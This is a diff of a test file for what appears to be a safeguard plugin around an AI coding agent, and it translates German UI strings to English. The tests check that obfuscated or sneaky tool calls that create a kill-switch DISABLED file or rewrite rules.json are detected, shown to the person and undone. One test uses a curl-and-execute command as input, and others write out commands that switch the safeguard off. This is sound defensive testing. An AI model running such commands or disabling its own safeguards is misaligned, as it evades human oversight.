@@ -48,15 +48,15 @@ test('effect check: DISABLED created by an obfuscated command is removed without
   runRm(host)
   const r = await dispatch(deps(host), { tool: 'Bash', input: { command: 'python3 -c "$(curl -s x)"' } }, sneaky(host, () => host.files.set(DIS, '')))
   assert.equal(host.files.has(DIS), false)
-  assert.ok(r.context?.some(c => c.includes('rückgängig')))
-  assert.ok(host.toasts.some(t => t.includes('Notausschalter')))
+  assert.ok(r.context?.some(c => c.includes('undone')))
+  assert.ok(host.toasts.some(t => t.includes('kill switch')))
   assert.equal(host.asked.length, 1) // asked, dismissed → undone
 })
 
 test('effect check: the person can keep their own change', async () => {
   const host = new FakeHost()
   runRm(host)
-  host.answers = ['Behalten']
+  host.answers = ['Keep']
   await dispatch(deps(host), { tool: 'Bash', input: { command: 'sleep 30' } }, sneaky(host, () => host.files.set(DIS, '')))
   assert.equal(host.files.has(DIS), true)
 })
@@ -111,7 +111,7 @@ test('effect check: read tools are not checked, no change no dialog', async () =
 test('exo entries: read, restore and remove', () => {
   assert.equal(exoEntry('{"pluginConfigs":{"exo@inline":{"a":1},"x":{}}}'), '{"exo@inline":{"a":1}}')
   assert.equal(exoEntry('{"theme":"dark"}'), null)
-  assert.equal(exoEntry('{kaputt'), '<unlesbar>')
+  assert.equal(exoEntry('{kaputt'), '<unreadable>')
   const restored = JSON.parse(restoreEntry('{"pluginConfigs":{"exo":{"a":2}}}', null)!)
   assert.equal(restored.pluginConfigs, undefined)
   assert.equal(restoreEntry('{kaputt', null), null)
@@ -152,7 +152,7 @@ test('a cd within the command counts too', () => {
 
 test('a Write the person allowed up front is not asked about again', async () => {
   const host = new FakeHost()
-  host.answers = ['Zulassen']
+  host.answers = ['Allow']
   await dispatch(deps(host), { tool: 'Write', input: { file_path: DIS, content: '' } }, sneaky(host, () => host.files.set(DIS, '')))
   assert.equal(host.asked.length, 1)
   assert.equal(host.files.has(DIS), true)
@@ -161,7 +161,7 @@ test('a Write the person allowed up front is not asked about again', async () =>
 test('after a Bash approval the effect is asked about once more (the text does not show it)', async () => {
   const host = new FakeHost()
   runRm(host)
-  host.answers = ['Zulassen', 'Behalten']
+  host.answers = ['Allow', 'Keep']
   await dispatch(deps(host), { tool: 'Bash', input: { command: 'touch ~/.claude/exo/DISABLED' } }, sneaky(host, () => host.files.set(DIS, '')))
   assert.equal(host.asked.length, 2)
   assert.equal(host.files.has(DIS), true)
@@ -170,7 +170,7 @@ test('after a Bash approval the effect is asked about once more (the text does n
 test('an approved change of one switch does not cover another one', async () => {
   const host = new FakeHost()
   runRm(host)
-  host.answers = ['Zulassen'] // allows the rules.json edit it was shown …
+  host.answers = ['Allow'] // allows the rules.json edit it was shown …
   await dispatch(deps(host), { tool: 'Bash', input: { command: 'cp /tmp/r ~/.claude/exo/rules.json' } }, sneaky(host, () => {
     host.files.set(RULES, '{}')
     host.files.set(DIS, '') // … but the command also switched exo off
@@ -181,7 +181,7 @@ test('an approved change of one switch does not cover another one', async () => 
 test('a Write the person allowed is kept, other switches are still checked', async () => {
   const host = new FakeHost()
   runRm(host)
-  host.answers = ['Zulassen']
+  host.answers = ['Allow']
   await dispatch(deps(host), { tool: 'Write', input: { file_path: RULES, content: '{}' } }, sneaky(host, () => {
     host.files.set(RULES, '{}')
     host.files.set(DIS, '')
